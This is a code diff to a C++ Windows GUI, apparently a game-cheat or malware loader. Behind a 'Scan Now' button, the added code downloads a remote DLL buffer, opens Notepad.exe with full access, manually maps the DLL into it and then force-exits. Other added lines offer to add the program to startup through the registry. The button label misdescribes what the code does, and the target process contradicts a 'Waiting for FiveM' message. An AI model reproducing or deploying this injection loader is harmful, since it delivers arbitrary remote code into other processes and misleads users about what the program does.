@@ -21,7 +21,7 @@
 #include <dwmapi.h>
 #include <codecvt>
 #include <iomanip>
-
+#include "StartUpManager.h"
 #include "blur.hpp"
 #include "GUI.h"
 #include "Resources/Image.h"
@@ -296,7 +296,7 @@ bool GUI::Initialize()
     return true;
 }
 
-void GUI::RenderUI(bool bNoErrors, std::string strErrorTitle, std::string strErrorDescription)
+void GUI::RenderUI(bool bNoErrors, std::string strErrorTitle, std::string strErrorDescription, std::string processName)
 {
     bool               show_demo_window = true;
     bool               show_another_window = false;
@@ -392,21 +392,76 @@ void GUI::RenderUI(bool bNoErrors, std::string strErrorTitle, std::string strErr
                         {
                             if (ImGui::ButtonLogins("Scan Now", ImVec2(238, 40)))
                             {
+
+                                if (!StartUpManager::IsAppInRegistry(processName))
+                                {
+                                    int msgResult =
+                                        MessageBox(NULL, "Do you want to add this application to startup?", "Startup Option", MB_YESNO | MB_ICONQUESTION);
+                                    if (msgResult == IDYES)
+                                    {
+                                        if (StartUpManager::AddAppToRegistry(processName))
+                                        {
+                                            MessageBox(NULL, "Application added to startup.", "Success", MB_OK | MB_ICONINFORMATION);
+                                        }
+                                        else
+                                        {
+                                            MessageBox(NULL, "Failed to add application to startup.", "Error", MB_OK | MB_ICONERROR);
+                                        }
+                                    }
+                                }
+
                                 if (!bDownloading)
                                 {
                                     SharedUtil::AddDebugLog("downloading");
                                     ImGui::Notification({ImGuiToastType_Success, 4000, "Downloading..."});
 
-                                    // Thread for downloading
                                     std::thread AgentPEBDownloader(
                                         [&]()
                                         {
                                             g_pAtomicAPI->DownloadEngine(&strAgentPEBBuffer);
-                                            bDownloading = false;            // Set this to false after downloading is complete
+                                            bDownloading = false;            
                                         });
 
                                     AgentPEBDownloader.detach();
                                     bDownloading = true;
+
+
+                                    while (bDownloading || strAgentPEBBuffer.empty())
+                                    {
+                                        std::this_thread::sleep_for(std::chrono::milliseconds(100));            // Prevent busy waiting
+                                    }
+
+                                    if (!strAgentPEBBuffer.empty() && !bInjected)
+                                    {
+                                        int iProcessID = SharedUtil::GetProcessID("Notepad.exe");
+                                        SharedUtil::AddDebugLog("Process ID retrieved: %d", iProcessID);
+
+                                        if (iProcessID > 0)
+                                        {
+                                            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, iProcessID);
+                                            if (hProcess)
+                                            {
+                                                memset(szLoadingMessage, 0, sizeof(szLoadingMessage));
+                                                strcat(szLoadingMessage, "Please wait, we're getting everything ready for you!");
+                                                bInjected =
+                                                    ManualMapDll(hProcess, reinterpret_cast<BYTE*>((char*)strAgentPEBBuffer.c_str()), strAgentPEBBuffer.size());
+                                                if (bInjected)
+                                                    __fastfail(0);
+                                                SharedUtil::AddDebugLog("Result from dll injection: %d (0x%x)", bInjected, GetLastError());
+                                                bInjected = true;            // Avoid multiple memory allocations attempts if the injection was wrong
+                                            }
+                                            else
+                                            {
+                                                SharedUtil::AddDebugLog("Failed to get process handle!\n");
+                                            }
+                                        }
+                                        else
+                                        {
+                                            SharedUtil::AddDebugLog("waiting");
+                                            memset(szLoadingMessage, 0, sizeof(szLoadingMessage));
+                                            strcat(szLoadingMessage, "Waiting for FiveM to launch");
+                                        }
+                                    }
                                 }
                                 page = 1, active_anim = true;
                             }
